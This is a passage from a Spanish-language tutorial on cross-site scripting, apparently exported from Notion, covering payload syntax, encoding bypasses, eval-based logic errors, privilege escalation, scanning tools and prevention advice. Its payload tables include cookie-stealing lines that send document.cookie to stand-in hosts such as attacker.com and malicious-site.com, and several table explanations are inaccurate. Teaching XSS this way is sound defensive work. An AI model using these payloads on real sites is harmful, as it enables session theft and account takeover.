class="highlight-purple_background"><code>onmouseover</code></mark><mark class="highlight-purple_background"> para ejecutar código malicioso:</mark></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="70113a0c-2f8e-49d4-89fa-97e9a4d7e977" class="code code-wrap"><code class="language-Plain Text">&lt;input type=&quot;text&quot; value=&quot;XSS&quot; onmouseover=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</code></pre><p id="b64ea30f-2243-46ac-9376-e33c58196f36" class=""><mark class="highlight-purple_background">En este ejemplo, el script malicioso se ejecutará cuando el usuario pase el puntero del ratón sobre el campo de entrada de texto.</mark></p><p id="d1378be0-730b-4c6a-939d-ee7dab5c5677" class="">
+</p><p id="f6d24860-ac51-47fc-8508-53cffa88098b" class=""><span style="border-bottom:0.05em solid"><strong>Ejemplo 2:</strong></span></p><p id="2a210d54-ed45-42ee-90a5-115fbcbfe05b" class="">Este payload intenta ejecutar una alerta con el mensaje “XSS” en el navegador del usuario cuando la imagen no se carga. </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8717e62c-3148-4b05-99bc-872a22370b87" class="code"><code class="language-HTML">&lt;img src=x onerror=alert(‘XSS’)&gt;</code></pre><p id="62608a73-c402-45ff-83bd-55efa53e3f49" class="">
+</p><p id="71d0fe03-7b07-4acb-861f-771127b3618a" class="">Aquí hay una lista de ejemplos adicionales de Alternative JavaScript Syntax:</p><table id="91492215-89ea-4ba5-bad9-f2758c0f0eb5" class="simple-table"><thead class="simple-table-header"><tr id="f8e4e385-4958-4496-9037-4016974cc0c8"><th id="HICJ" class="block-color-orange_background simple-table-header" style="width:714.9886169433594px">Payload</th><th id="X[@{" class="block-color-orange_background simple-table-header" style="width:671px">Explicación</th></tr></thead><tbody><tr id="1dea8452-feba-4531-b44e-c2be2afba39f"><td id="HICJ" class="" style="width:714.9886169433594px">&lt;body onload=alert(&#x27;XSS&#x27;)&gt;</td><td id="X[@{" class="" style="width:671px">Ejecuta una alerta cuando la página web se carga.</td></tr><tr id="46cfd496-3f70-4e95-8955-069ba4bbfc40"><td id="HICJ" class="" style="width:714.9886169433594px">&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</td><td id="X[@{" class="" style="width:671px">Ejecuta una alerta cuando la imagen no se carga.</td></tr><tr id="70d3abe2-c5ca-463a-818a-967985be5317"><td id="HICJ" class="" style="width:714.9886169433594px">&lt;img src=x onerror=&quot;alert(&#x27;XSS&#x27;);&quot;&gt;</td><td id="X[@{" class="" style="width:671px">Ejecuta una alerta cuando la imagen no se carga.</td></tr><tr id="d16f2f38-be81-4aa4-a58c-5beea0ee09d0"><td id="HICJ" class="" style="width:714.9886169433594px">&lt;svg/onload=alert(&#x27;XSS&#x27;)&gt;</td><td id="X[@{" class="" style="width:671px">Ejecuta una alerta cuando se carga un archivo SVG.</td></tr><tr id="5177f65c-64f0-4ea4-9a22-2fe61ed215ee"><td id="HICJ" class="" style="width:714.9886169433594px">&lt;marquee/onstart=alert(&#x27;XSS&#x27;)&gt;</td><td id="X[@{" class="" style="width:671px">Ejecuta una alerta cuando se inicia el efecto de desplazamiento de texto.</td></tr><tr id="53d3dbb1-46c0-4525-9b42-910af91f4833"><td id="HICJ" class="" style="width:714.9886169433594px">&lt;input type=&quot;text&quot; value=&quot;XSS&quot; onmouseover=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</td><td id="X[@{" class="" style="width:671px">Ejecuta una alerta cuando el usuario coloca el cursor sobre un campo de entrada de texto.</td></tr><tr id="5c9c0397-5171-445a-8396-e14c70781fcc"><td id="HICJ" class="" style="width:714.9886169433594px">&lt;input type=&quot;text&quot; value=&quot;XSS&quot; onfocus=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</td><td id="X[@{" class="" style="width:671px">Ejecuta una alerta cuando el usuario hace clic en un campo de entrada de texto.</td></tr><tr id="9fadd246-5f2d-45e5-b04e-e0e3716fb211"><td id="HICJ" class="" style="width:714.9886169433594px">&lt;input type=&quot;text&quot; value=&quot;XSS&quot; onblur=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</td><td id="X[@{" class="" style="width:671px">Ejecuta una alerta cuando el usuario sale de un campo de entrada de texto.</td></tr><tr id="bb372873-086b-455d-8518-e0c62a607935"><td id="HICJ" class="" style="width:714.9886169433594px">&lt;input type=&quot;text&quot; value=&quot;XSS&quot; onchange=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</td><td id="X[@{" class="" style="width:671px">Ejecuta una alerta cuando el usuario cambia el valor de un campo de entrada de texto.</td></tr><tr id="a0d149ed-dbae-4392-8b84-baefff98857b"><td id="HICJ" class="" style="width:714.9886169433594px">&lt;input type=&quot;text&quot; value=&quot;XSS&quot; onselect=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</td><td id="X[@{" class="" style="width:671px">Ejecuta una alerta cuando el usuario selecciona un campo de entrada de texto.</td></tr><tr id="c23f9eb2-3fcc-44ab-a806-ddac8a3d5c1c"><td id="HICJ" class="" style="width:714.9886169433594px">&lt;input type=&quot;text&quot; value=&quot;XSS&quot; onsubmit=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</td><td id="X[@{" class="" style="width:671px">Ejecuta una alerta cuando se envía un formulario.</td></tr><tr id="061e0e3d-d5a2-46ed-a468-7d3717f6beb3"><td id="HICJ" class="" style="width:714.9886169433594px">&lt;input type=&quot;text&quot; value=&quot;XSS&quot; onreset=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</td><td id="X[@{" class="" style="width:671px">Ejecuta una alerta cuando se restablece un formulario.</td></tr><tr id="4225da89-d001-46f7-90de-176ff87eab6c"><td id="HICJ" class="" style="width:714.9886169433594px">&lt;input type=&quot;text&quot; value=&quot;XSS&quot; onkeydown=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</td><td id="X[@{" class="" style="width:671px">Ejecuta una alerta cuando el usuario presiona una tecla.</td></tr><tr id="1b627c62-9d5d-4429-ab9e-8b9b12cc679b"><td id="HICJ" class="" style="width:714.9886169433594px">&lt;input type=&quot;text&quot; value=&quot;XSS&quot; onkeyup=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</td><td id="X[@{" class="" style="width:671px">Ejecuta una alerta cuando el usuario suelta una tecla.</td></tr><tr id="066160be-9532-4341-bf2f-213ee57939bf"><td id="HICJ" class="" style="width:714.9886169433594px">&lt;input type=&quot;text&quot; value=&quot;XSS&quot; onkeypress=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</td><td id="X[@{" class="" style="width:671px">Ejecuta una alerta cuando el usuario presiona una tecla.</td></tr><tr id="63cd5265-031e-49a4-ba5f-4fb13e6ba253"><td id="HICJ" class="" style="width:714.9886169433594px">&lt;a href=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;XSS&lt;/a&gt;</td><td id="X[@{" class="" style="width:671px">Ejecuta una alerta cuando se hace clic en un enlace.</td></tr><tr id="7cab25b5-3240-4ec4-af59-49a1e0fc33ed"><td id="HICJ" class="" style="width:714.9886169433594px">&lt;iframe src=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;&lt;/iframe&gt;</td><td id="X[@{" class="" style="width:671px">Carga un iframe con un código JavaScript que ejecuta una alerta.</td></tr><tr id="fb6a4a05-f30a-4cbe-9176-79b642798ec6"><td id="HICJ" class="" style="width:714.9886169433594px">&lt;img src=&quot;javascript:alert(&#x27;XSS&#x27;);&quot; /&gt;</td><td id="X[@{" class="" style="width:671px">Ejecuta una alerta cuando la imagen no se carga.</td></tr><tr id="0909fc3b-c722-4e72-acdf-5beded39bbd4"><td id="HICJ" class="" style="width:714.9886169433594px">&lt;a href=&quot;javascript:document.cookie=&#x27;cookievalue=XSS&#x27;&quot;&gt;XSS&lt;/a&gt;</td><td id="X[@{" class="" style="width:671px">Ejecuta una alerta con el valor de la cookie si el atacante tiene acceso a ella.</td></tr><tr id="2e9da05c-6fe1-4db5-83f4-bc841231fbc3"><td id="HICJ" class="" style="width:714.9886169433594px">&lt;object type=&quot;text/x-scriptlet&quot; data=&quot;<a href="http://attacker.com/XSS.html">http://attacker.com/XSS.html</a>&quot;&gt;&lt;/object&gt;</td><td id="X[@{" class="" style="width:671px">Ejecuta un script alojado en un servidor controlado por el atacante.</td></tr><tr id="481efafe-2eae-4527-93fc-e7749b81aab5"><td id="HICJ" class="" style="width:714.9886169433594px">&lt;script&gt;document.write(&#x27;&lt;img src=&quot;<a href="http://attacker.com/XSS.php?c=%27+document.cookie+%27">http://attacker.com/XSS.php?c=&#x27;+document.cookie+&#x27;</a>&quot; /&gt;&#x27;);&lt;/script&gt;</td><td id="X[@{" class="" style="width:671px">Carga una imagen alojada en un servidor controlado por el atacante y envía la cookie del usuario.</td></tr><tr id="cecf4cd6-6b4e-4ddf-bce9-197a32aaf0a1"><td id="HICJ" class="" style="width:714.9886169433594px">&lt;script&gt;document.location=&#x27;<a href="http://attacker.com/cgi-bin/cookie.cgi?%27+document.cookie">http://attacker.com/cgi-bin/cookie.cgi?&#x27;+document.cookie</a>&lt;/script&gt;</td><td id="X[@{" class="" style="width:671px">Redirige al usuario a una página</td></tr></tbody></table><h2 id="aee0496d-52fd-434d-8920-634313e6f0ba" class="">Encoding</h2><p id="0f750d81-9b68-4722-8360-3470e1146dc0" class="">Es una técnica que consiste en reemplazar los caracteres especiales que pueden ser interpretados como código HTML o JavaScript por sus equivalentes codificados, con el fin de que se ejecuten en el navegador del usuario. Por ejemplo, si un filtro busca la cadena “&lt;script&gt;” para evitar que se inserte un elemento HTML &lt;script&gt;, se podría usar “&lt;script&gt;” para burlar el filtro. Un ejemplo de payload que usa encoding para XSS es el siguiente:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0ee00274-b979-4334-8e35-23a6b39c1a47" class="code"><code class="language-HTML">http://www.ejemplo.com/buscar?consulta=%3Cscript%3Ealert(&#x27;XSS&#x27;)%3C/script%3E</code></pre><p id="8f470909-01a0-47cf-9ea4-057f88da2b01" class="">Este payload intenta ejecutar una alerta con el mensaje “XSS” en el navegador del usuario.</p><p id="e650b80d-2758-4c95-8a83-436f9cb30095" class="">Otros ejemplos de uso de Encoding:</p><ul id="1a7c5a26-8758-4f0d-acf6-08718a0ded79" class="bulleted-list"><li style="list-style-type:disc">URL original: <code>http://www.ejemplo.com/buscar?consulta=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code><ul id="b533c2e6-e387-432e-8589-e95d23a56cce" class="bulleted-list"><li style="list-style-type:circle">URL con encoding: <code>http://www.ejemplo.com/buscar?consulta=%3Cscript%3Ealert(&#x27;XSS&#x27;)%3C/script%3E</code></li></ul></li></ul><ul id="f22149be-3947-48ea-a486-ec9279a54bf9" class="bulleted-list"><li style="list-style-type:disc">URL original: <code>http://www.ejemplo.com/buscar?consulta=&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</code><ul id="7f237b15-9560-4360-9f78-2cccb0e22d38" class="bulleted-list"><li style="list-style-type:circle">URL con encoding: <code>http://www.ejemplo.com/buscar?consulta=%3Cimg%20src%3Dx%20onerror%3Dalert(&#x27;XSS&#x27;)%3E</code></li></ul><p id="8bd07c5e-2c70-4a80-b35b-dd9f4a31b97d" class="">
+</p></li></ul><p id="3257fe75-a71b-43a0-9a44-e936519bc12b" class="">Ejemplos de codificación para caracteres especiales en HTML:</p><table id="8f58d387-8239-4ad5-af95-d50f56a8f9b4" class="simple-table"><thead class="simple-table-header"><tr id="74f3ba75-dbec-4990-9fb6-131bd3782c5f"><th id="GsD@" class="block-color-teal_background simple-table-header"><strong>Caracter </strong><strong>especial</strong></th><th id="XNdF" class="block-color-teal_background simple-table-header"><strong>Significado</strong></th><th id="p[}J" class="block-color-teal_background simple-table-header"><strong>Representación HTML</strong></th></tr></thead><tbody><tr id="f8205b32-22c1-46ea-85fc-70ef8761676b"><td id="GsD@" class="">&lt;</td><td id="XNdF" class="">Menor que</td><td id="p[}J" class=""><code>&amp;lt;</code></td></tr><tr id="b3e65646-605e-48b7-ad7c-fb4a24dd8eb0"><td id="GsD@" class="">&gt;</td><td id="XNdF" class="">Mayor que</td><td id="p[}J" class=""><code>&amp;gt;</code></td></tr><tr id="58e285bf-08fe-49c6-9a73-653da942b395"><td id="GsD@" class="">&amp;</td><td id="XNdF" class="">Ampersand</td><td id="p[}J" class=""><code>&amp;amp;</code></td></tr><tr id="58606ddc-b8ff-4d80-bdc4-23a3916da8ff"><td id="GsD@" class="">&quot;</td><td id="XNdF" class="">Comillas dobles</td><td id="p[}J" class=""><code>&amp;quot;</code></td></tr><tr id="9cff6029-5a42-42b6-bffe-ff3d597dcb22"><td id="GsD@" class="">&#x27;</td><td id="XNdF" class="">Comillas simples</td><td id="p[}J" class=""><code>&amp;#39;</code> o <code>&amp;apos;</code></td></tr></tbody></table><p id="310fe023-09ec-42ca-8878-3807d2a29724" class="">Por ejemplo, si quisieras mostrar el texto <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code> en una página web, podrías codificar los caracteres especiales de la siguiente manera:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ef5467fe-3ac2-4a81-b8c7-980bad8dfbc1" class="code code-wrap"><code class="language-JavaScript">&amp;lt;script&amp;gt;alert(&amp;#39;XSS&amp;#39;)&amp;lt;/script&amp;gt;</code></pre><p id="ae5897cf-7f5e-4af8-92fb-a13bffa30d81" class="">De esta manera, los caracteres <code>&lt;</code>, <code>&gt;</code>, y <code>&#x27;</code> se representan mediante su correspondiente código HTML, <code>&amp;lt;</code>, <code>&amp;gt;</code>, y <code>&amp;#39;</code>, respectivamente. Esto evita que los caracteres especiales sean interpretados como código malicioso.</p><h2 id="b0168e1c-58d1-464c-bf2a-629d5132deff" class="">Errores en la lógica de la aplicación</h2><p id="9f4cf7ee-e511-491a-890d-56716005b24c" class="">Aprovechar los errores lógicos es una técnica utilizada para detectar vulnerabilidades XSS en una aplicación web. Esta técnica se basa en la capacidad de los atacantes para identificar patrones y comportamientos inesperados en una aplicación web que pueden ser explotados para inyectar código malicioso.</p><p id="3279f6b2-5637-4f86-95c2-405bb1ba53bc" class="">Por ejemplo, si una aplicación web utiliza una función <code>eval()</code> para procesar datos de entrada, un atacante podría utilizar una cadena de entrada que incluya código malicioso para explotar la vulnerabilidad. Si la aplicación web no valida adecuadamente los datos de entrada, el código malicioso se ejecutará como si fuera código legítimo.</p><p id="5a555ad7-0b04-4423-887c-5345ba7589ab" class="">Otro ejemplo de un error lógico es el uso de una secuencia de comandos de JavaScript en una URL. Si una aplicación web no valida adecuadamente los datos de entrada en una URL, un atacante podría incluir código malicioso en la URL que se ejecutará en el navegador del usuario.</p><p id="af289ed3-0419-44a1-8c2b-15056a71ffbc" class="">Aquí hay algunos ejemplos de cómo se podrían utilizar los errores lógicos para explotar vulnerabilidades XSS en una aplicación web:</p><ul id="c2c0312b-4614-47e9-9a7d-19a06a10ad1e" class="bulleted-list"><li style="list-style-type:disc">Ejemplo de eval(): <code>eval(document.location.hash.substr(1))</code><ul id="eca4db40-17ad-4f9a-9c31-dc4b31ad4b1a" class="bulleted-list"><li style="list-style-type:circle">En este ejemplo, un atacante podría incluir código malicioso en el fragmento de la URL después del símbolo <code>#</code>. Si la aplicación web utiliza la función <code>eval()</code> para procesar el fragmento de la URL, el código malicioso se ejecutará.</li></ul><ul id="0429dcf7-3f2a-4846-9aba-3f70506cd576" class="bulleted-list"><li style="list-style-type:circle">Ejemplo de URL: <code>http://www.ejemplo.com/pagina.html#alert(&#x27;XSS&#x27;)</code></li></ul><p id="16395006-07c6-4a36-a624-7825a45b7365" class="">
+</p></li></ul><ul id="207bb5ac-a32f-4c67-bb40-384192fb4c35" class="bulleted-list"><li style="list-style-type:disc">Ejemplo de JavaScript en una URL: <code>&lt;a href=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;Click Me&lt;/a&gt;</code><ul id="989f2632-a582-43a9-8689-f890c07b3330" class="bulleted-list"><li style="list-style-type:circle">En este ejemplo, el atacante ha incluido un script de JavaScript en el atributo <code>href</code> del enlace. Si la aplicación web no valida adecuadamente los datos de entrada en el atributo <code>href</code>, el script de JavaScript se ejecutará cuando el usuario haga clic en el enlace.</li></ul><ul id="6dc3275e-95cb-45d8-a3db-9ee51f4458f7" class="bulleted-list"><li style="list-style-type:circle">Ejemplo de URL: <code>http://www.ejemplo.com/pagina.html?a=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code></li></ul></li></ul><h2 id="cdbed331-0df0-40fc-87a5-9b1d8b192a32" class="">Escalación de privilegios con XSS</h2><p id="aa4d8b84-15da-4cad-bee7-cc2dcb5e0a2f" class="">La escalada de privilegios a través de una vulnerabilidad de XSS ocurre cuando un atacante puede obtener acceso a privilegios elevados en un sitio web al explotar una vulnerabilidad XSS.</p><p id="3040098a-8d10-47d4-977c-8851d4e8b1de" class="">Por ejemplo, si un usuario con privilegios limitados inicia sesión en un sitio web y, a través de una vulnerabilidad XSS, un atacante puede obtener acceso a la sesión de ese usuario, el atacante podría ser capaz de realizar acciones que solo están permitidas para usuarios con privilegios elevados.</p><p id="84b0ccd9-4d00-4194-b606-9283de6a83af" class="">Una forma común de escalar privilegios utilizando una vulnerabilidad de XSS es a través de la inyección de JavaScript malicioso en una página web vulnerable. El JavaScript malicioso podría usarse para robar información confidencial, como las credenciales de inicio de sesión del usuario, robar una Cookie, o para ejecutar acciones maliciosas en el sitio web.</p><p id="cd84c8e0-c491-4a50-9b55-c244e8c6a11a" class="">Por ejemplo, si un sitio web permite a los usuarios enviar mensajes privados entre sí y no filtra adecuadamente las entradas de usuario, un atacante podría enviar un mensaje con un script XSS malicioso. Si el destinatario del mensaje abre el mensaje y hace clic en el enlace o botón infectado, se ejecutará el script malicioso y el atacante podría escalar sus privilegios.</p><p id="04248615-18b6-40b6-b951-e208eb48c8b8" class="">Aquí hay algunos ejemplos de URLs que podrían ser utilizadas en un ataque de escalada de privilegios a través de una vulnerabilidad XSS:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="478a1ec4-0b2d-4be4-93ba-5acf3899a3be" class="code"><code class="language-JavaScript">https://www.example.com/search?q=&lt;script&gt;document.location.href=&#x27;https://www.malicious-site.com/steal-cookies.php?cookie=&#x27;+document.cookie&lt;/script&gt;</code></pre><p id="da661d5f-735d-4104-b117-05a61b2b86b4" class="">En este ejemplo, el atacante intenta robar la cookie del usuario y enviarla a su sitio malicioso. Si la víctima hace click en un enlace o visita una página web que contenga esta URL, el script XSS se ejecutará y la cookie se enviará al sitio del atacante.</p><p id="bf829975-a9d7-4d74-813f-49481fcd3f5f" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="630a73db-d6ce-4ca8-a4df-dc5b706bce59" class="code"><code class="language-JavaScript">https://www.example.com/profile/edit?id=&lt;script&gt;document.getElementById(&#x27;admin-field&#x27;).value = &#x27;true&#x27;;&lt;/script&gt;</code></pre><p id="c9473adf-6d0d-4b0e-b6b9-0419a4edd014" class="">En este ejemplo, el atacante intenta cambiar el valor de un campo en el perfil de usuario para que el usuario parezca tener privilegios de administrador. Si la víctima hace click en un enlace o visita una página web que contenga esta URL, el script XSS se ejecutará y cambiará el valor del campo.</p><h1 id="33f23d59-6721-4e92-a39c-bbcb09349a62" class="">Herramientas y Automatización para detectar  y explotar XSS</h1><p id="b839182a-493b-4b39-b6ee-c2ebfbb23882" class="">Aquí hay una lista de herramientas y utilidades que pueden ser utilizadas para detectar y explotar vulnerabilidades XSS:</p><table id="0fc0c186-b193-4925-bdd1-c5ddfe3af786" class="simple-table"><thead class="simple-table-header"><tr id="d8760135-518b-4349-aed3-30024009cc32"><th id="Irpd" class="block-color-orange_background simple-table-header">Herramienta</th><th id="_VUi" class="block-color-orange_background simple-table-header" style="width:1188.9970703125px">Descripción</th></tr></thead><tbody><tr id="f79a9f93-92c9-485f-ba65-ad4cc22aee28"><td id="Irpd" class=""><a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project">OWASP Zed Attack Proxy Project</a></td><td id="_VUi" class="" style="width:1188.9970703125px">Herramienta de escaneo de seguridad de código abierto que se utiliza para encontrar vulnerabilidades de seguridad en aplicaciones web. Incluye un escáner de vulnerabilidades XSS y otras vulnerabilidades comunes.</td></tr><tr id="784c8613-3643-4ad9-9a7e-323261d60213"><td id="Irpd" class=""><a href="https://portswigger.net/burp">Burp Suite</a></td><td id="_VUi" class="" style="width:1188.9970703125px">Herramienta de prueba de penetración que se utiliza para encontrar vulnerabilidades de seguridad en aplicaciones web. Incluye un escáner de vulnerabilidades XSS y otras vulnerabilidades comunes.</td></tr><tr id="659d282c-6c92-42e1-a820-3e3877450943"><td id="Irpd" class=""><a href="https://www.invicti.com/">Invicti</a></td><td id="_VUi" class="" style="width:1188.9970703125px">Herramienta de escaneo de seguridad automatizada que se utiliza para encontrar vulnerabilidades de seguridad en aplicaciones web. Incluye un escáner de vulnerabilidades XSS y otras vulnerabilidades comunes.</td></tr><tr id="d37f4a9b-44f3-4e50-bbff-b9082c82fef5"><td id="Irpd" class=""><a href="https://www.hcltechsw.com/appscan">AppScan</a></td><td id="_VUi" class="" style="width:1188.9970703125px">Herramienta de análisis de seguridad de aplicaciones web que se utiliza para encontrar vulnerabilidades de seguridad en aplicaciones web. Incluye un escáner de vulnerabilidades XSS y otras vulnerabilidades comunes.</td></tr><tr id="58137570-cff7-47a6-87e2-16b7bcd68158"><td id="Irpd" class=""><a href="https://www.acunetix.com/">Acunetix</a></td><td id="_VUi" class="" style="width:1188.9970703125px">Herramienta de escaneo de seguridad automatizada que se utiliza para encontrar vulnerabilidades de seguridad en aplicaciones web. Incluye un escáner de vulnerabilidades XSS y otras vulnerabilidades comunes.</td></tr><tr id="042e1161-79aa-4620-b302-63ca530c69b9"><td id="Irpd" class=""><a href="https://github.com/s0md3v/XSStrike">XSStrike</a></td><td id="_VUi" class="" style="width:1188.9970703125px">Herramienta de prueba de penetración de código abierto que se utiliza para encontrar vulnerabilidades XSS en aplicaciones web utilizando técnicas de fuzzing. Incluye una gran cantidad de payloads de prueba para detectar vulnerabilidades de XSS.</td></tr><tr id="5080e0d8-d77e-4047-88e6-514bc4dab267"><td id="Irpd" class=""><a href="https://github.com/faizann24/XssPy">XssPy</a></td><td id="_VUi" class="" style="width:1188.9970703125px">Es un escáner de vulnerabilidades XSS basado en Python que utiliza un motor inteligente para encontrar puntos de entrada potenciales y generar payloads adecuados. También soporta cookies, proxies y cabeceras personalizadas. Es utilizado por varias organizaciones como Microsoft, Stanford y Motorola</td></tr><tr id="ac48eb58-4e78-4078-9974-41375e6249ef"><td id="Irpd" class=""><a href="https://www.arachni-scanner.com/.">Arachni</a></td><td id="_VUi" class="" style="width:1188.9970703125px">Es un escáner de seguridad web de alto rendimiento construido en Ruby que puede detectar más de 500 tipos de vulnerabilidades, incluyendo XSS. Ofrece una interfaz web, una interfaz de línea de comandos y una API REST. También permite personalizar los escaneos con plugins, scripts y perfiles.  </td></tr><tr id="dab111ca-fb1e-4c4d-96f1-b8796a152ef6"><td id="Irpd" class=""><a href="https://github.com/xmendez/wfuzz.">Wfuzz</a></td><td id="_VUi" class="" style="width:1188.9970703125px">Es una herramienta de fuerza bruta web que puede usarse para descubrir recursos ocultos, inyecciones y otras vulnerabilidades. Permite usar múltiples fuentes de datos, encoders, filtros y payloads, así como integrarse con otras herramientas como Burp Suite o OWASP ZAP. Puede usarse para encontrar vulnerabilidades de XSS mediante el uso de diccionarios específicos. </td></tr><tr id="87651e72-a531-41db-b7fa-a002ddf1df75"><td id="Irpd" class=""><a href="https://github.com/beefproject/beef">BeEF XSS Exploitation Framework</a></td><td id="_VUi" class="" style="width:1188.9970703125px">Una herramienta de prueba de penetración de código abierto que se utiliza para explotar vulnerabilidades XSS en navegadores web. BeEF se ejecuta en un servidor y se utiliza para controlar y manipular navegadores web vulnerables.</td></tr></tbody></table><h1 id="83875613-73c9-4ebc-b9e1-4b8b8ca3401f" class="">Prevención</h1><h2 id="32a6ca0f-c616-43e3-83a3-f237abba1e03" class="">Recomendaciones para prevenir vulnerabilidades XSS</h2><ul id="f2cb7c2f-5be6-4a21-ad9d-eea6011ccb95" class="bulleted-list"><li style="list-style-type:disc"><strong>Validación y sanitización de entrada de usuario:</strong> Todas las entradas de usuario deben ser validadas y sanitizadas antes de ser procesadas por la aplicación web. Esto incluye tanto la entrada de formularios como la entrada de URL. La validación y sanitización de entrada debe incluir la eliminación de caracteres especiales y la codificación de caracteres peligrosos.</li></ul><ul id="26548823-e9b7-4d05-9583-7a3d71c52106" class="bulleted-list"><li style="list-style-type:disc"><strong>Utilice encabezados HTTP para prevenir la inyección de contenido:</strong> Los encabezados HTTP, como <code>Content-Security-Policy</code> y <code>X-XSS-Protection</code>, pueden ser utilizados para prevenir la inyección de contenido en páginas web y reducir el riesgo de vulnerabilidades XSS.</li></ul><ul id="05b8ef76-64ca-4913-9250-f7c3dee0e486" class="bulleted-list"><li style="list-style-type:disc"><strong>Minimice el uso de </strong><code><strong>eval()</strong></code><strong> y funciones similares:</strong> Las funciones como <code>eval()</code> y <code>setTimeout()</code> pueden ser utilizadas para ejecutar código malicioso. Por lo tanto, deben ser utilizadas con precaución y sólo cuando sea absolutamente necesario.</li></ul><ul id="b086f6bb-0230-41a6-a68b-7375db30aa24" class="bulleted-list"><li style="list-style-type:disc"><strong>Utilice frameworks y bibliotecas seguras:</strong> Los frameworks y bibliotecas de terceros deben ser seleccionados cuidadosamente y sólo utilizados si han sido probados y son seguros. Las versiones antiguas de frameworks y bibliotecas pueden tener vulnerabilidades conocidas, por lo que se recomienda mantenerlos actualizados.</li></ul><ul id="b33816ac-b393-491c-9058-e6fd20b609d4" class="bulleted-list"><li style="list-style-type:disc"><strong>Implemente la autenticación y autorización adecuadas:</strong> La autenticación y autorización adecuadas son esenciales para prevenir la ejecución de código malicioso en una aplicación web. La autenticación y autorización deben ser implementadas en todas las funciones críticas de la aplicación 